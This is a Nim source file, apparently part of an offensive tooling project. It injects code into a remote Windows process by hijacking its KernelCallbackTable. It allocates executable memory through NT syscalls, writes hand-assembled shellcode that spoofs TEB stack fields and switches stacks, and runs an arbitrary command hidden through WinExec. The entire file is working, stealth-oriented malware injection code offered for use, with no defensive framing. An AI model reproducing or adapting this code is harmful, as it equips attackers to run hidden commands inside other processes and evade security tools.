import winim, ../kct/kct_core, ../core/syscalls

type
    RemoteContext* = object
        status*:       uint64        # 0x00 (Atomic Gate)
        originalKct*:  pointer       # 0x08
        pWinExec*:     pointer       # 0x10
        cmdAddr*:      pointer       # 0x18
        stackBase*:    uint64        # 0x20 (New Stack High)
        stackLimit*:   uint64        # 0x28 (New Stack Low)

proc build_hyper_isolated_stub*(cBase: uint64, oAddr: uint64): seq[byte] =
    ## Builds the stealthiest KCT trampoline with TEB shadowing and stack isolation.
    var s: seq[byte] = @[]
    
    # [1] Prologue: Save all 16 registers + Flags
    s.add(0x50.byte)                                         # push rax
    s.add(0x9C.byte)                                         # pushfq
    s.add(@[0x51.byte, 0x52, 0x53, 0x55, 0x56, 0x57])       # rcx..rdi
    s.add(@[0x41.byte, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57]) # r8..r15

    # R11 as context base
    s.add(@[0x49.byte, 0xBB])
    for j in 0..7: s.add(cast[byte]((cBase shr (j * 8)) and 0xFF))
    
    # [2] Atomic Gate
    s.add(@[0xF0.byte, 0x41, 0x0F, 0xBA, 0x2B, 0x00]) # lock bts [r11], 0
    let jcPos = s.len
    s.add(@[0x72.byte, 0x00])

    # [3] TEB Hijacking (Shadowing StackBase/Limit)
    # GS:[0x08] = Base (High), GS:[0x10] = Limit (Low)
    s.add(@[0x65.byte, 0x4C.byte, 0x8B, 0x34.byte, 0x25.byte, 0x08, 0x00, 0x00, 0x00]) # mov r14, gs:[0x08]
    s.add(@[0x65.byte, 0x4C.byte, 0x8B, 0x3C.byte, 0x25.byte, 0x10, 0x00, 0x00, 0x00]) # mov r15, gs:[0x10]
    s.add(@[0x49.byte, 0x8B, 0x43, 0x20])                    # mov rax, [r11+0x20]
    s.add(@[0x65.byte, 0x48.byte, 0x89, 0x04.byte, 0x25.byte, 0x08, 0x00, 0x00, 0x00])
    s.add(@[0x49.byte, 0x8B, 0x43, 0x28])                    # mov rax, [r11+0x28]
    s.add(@[0x65.byte, 0x48.byte, 0x89, 0x04.byte, 0x25.byte, 0x10, 0x00, 0x00, 0x00])

    # [4] Stack Switching
    s.add(@[0x48.byte, 0x89, 0xE3])                          # mov rbx, rsp
    s.add(@[0x49.byte, 0x8B, 0x63, 0x20])                    # mov rsp, [r11+20h]
    s.add(@[0x48.byte, 0x83, 0xEC, 0x30])                    # sub rsp, 48 (Shadow Space + Align)
    
    # WinExec Call
    s.add(@[0x49.byte, 0x8B, 0x4B, 0x18])                    # cmdAddr in ctx
    s.add(@[0x48.byte, 0x31, 0xD2])                          # rdx = 0 (SW_HIDE)
    s.add(@[0x49.byte, 0xFF, 0x53, 0x10])                    # call WinExec address in ctx
    
    # [5] Restoration
    s.add(@[0x48.byte, 0x89, 0xDC])                          # restore rsp from rbx
    s.add(@[0x65.byte, 0x4C.byte, 0x89, 0x34.byte, 0x25.byte, 0x08, 0x00, 0x00, 0x00]) # restore teb base
    s.add(@[0x65.byte, 0x4C.byte, 0x89, 0x3C.byte, 0x25.byte, 0x10, 0x00, 0x00, 0x00]) # restore teb limit

    let skipPos = s.len
    s[jcPos + 1] = cast[byte](skipPos - (jcPos + 2))

    s.add(@[0x41.byte, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58])
    s.add(@[0x5F.byte, 0x5E, 0x5D, 0x5B, 0x5A, 0x59])
    s.add(0x9D.byte)
    s.add(0x58.byte)

    # JMP
    s.add(@[0x48.byte, 0xB8])
    for j in 0..7: s.add(cast[byte]((oAddr shr (j * 8)) and 0xFF))
    s.add(@[0xFF.byte, 0xE0])
    return s

proc inject_phantom_fiber*(hProcess: HANDLE, index: int, command: string): bool =
    ## High-level function to inject a command via KCT Phantom Fiber.
    var size: SIZE_T = 131072
    var remoteBase: pointer
    if NtAllocateVirtualMemory(hProcess, addr remoteBase, 0, addr size, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE) != 0:
        return false
    
    let ctxAddr = remoteBase
    let trampolineAddr = cast[pointer](cast[uint64](remoteBase) + 0x200)
    let cmdAddr = cast[pointer](cast[uint64](remoteBase) + 0x1000)
    let privateStackLimit = cast[uint64](remoteBase) + 0x2000
    let privateStackBase = cast[uint64](remoteBase) + cast[uint64](size) - 0x200

    var ctx: RemoteContext
    ctx.pWinExec = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec")
    ctx.cmdAddr = cmdAddr
    ctx.stackBase = privateStackBase
    ctx.stackLimit = privateStackLimit
    
    let kct = read_kct(hProcess)
    var original: pointer
    if NtReadVirtualMemory(hProcess, cast[pointer](cast[uint64](kct) + (index * 8).uint64), addr original, 8, nil) != 0:
        return false
    ctx.originalKct = original
    
    var written: SIZE_T
    discard NtWriteVirtualMemory(hProcess, ctxAddr, addr ctx, sizeof(ctx).SIZE_T, addr written)
    
    let fullCmd = command & "\0"
    discard NtWriteVirtualMemory(hProcess, cmdAddr, cast[pointer](cstring(fullCmd)), fullCmd.len.SIZE_T, addr written)

    let stub = build_hyper_isolated_stub(cast[uint64](ctxAddr), cast[uint64](original))
    discard NtWriteVirtualMemory(hProcess, trampolineAddr, addr stub[0], stub.len.SIZE_T, addr written)

    var dummy: pointer
    return patch_kct(hProcess, index, trampolineAddr, addr dummy, kct)
